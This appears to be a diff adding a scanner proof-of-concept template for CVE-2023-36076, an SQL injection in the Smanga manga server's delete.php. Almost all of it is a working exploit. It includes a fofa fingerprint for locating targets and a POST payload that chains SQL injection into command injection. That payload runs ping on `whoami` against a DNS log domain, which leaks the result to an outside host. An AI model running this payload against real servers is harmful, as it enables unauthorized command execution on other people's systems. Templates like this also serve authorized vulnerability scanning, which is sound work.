@@ -1,0 +1,21 @@
+id: poc-yaml-smanga-delete-php-sqli
+info:
+  name: Smanga delete.php SQL注入漏洞(CVE-2023-36076)
+  severity: critical
+  tags:
+  - CVE-2023-36076
+  - DNSLOG
+  finger: smanga
+  fofa: body="smanga"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /php/manga/delete.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: mangaId=1+union+select+*+from+%28select+1%29a+join+%28select+2%29b+join+%28select+3%29c+join+%28select+4%29d+join+%28select+%27%5C%22%3Bping+-c+3+%60whoami%60.{{.domain}}%3B%5C%22%27%29e+join+%28select+6%29f+join+%28select+7%29g+join+%28select+8%29h+join+%28select+9%29i+join+%28select+10%29j+join+%28select+11%29k+join+%28select+12%29l%3B&deleteFile=true
+  expression: status_code == 200 && contains(body,`"code":0,"message":"\u5220\u9664\u6210\u529f!"`)
+    && reverse.Verify()
+transport: http
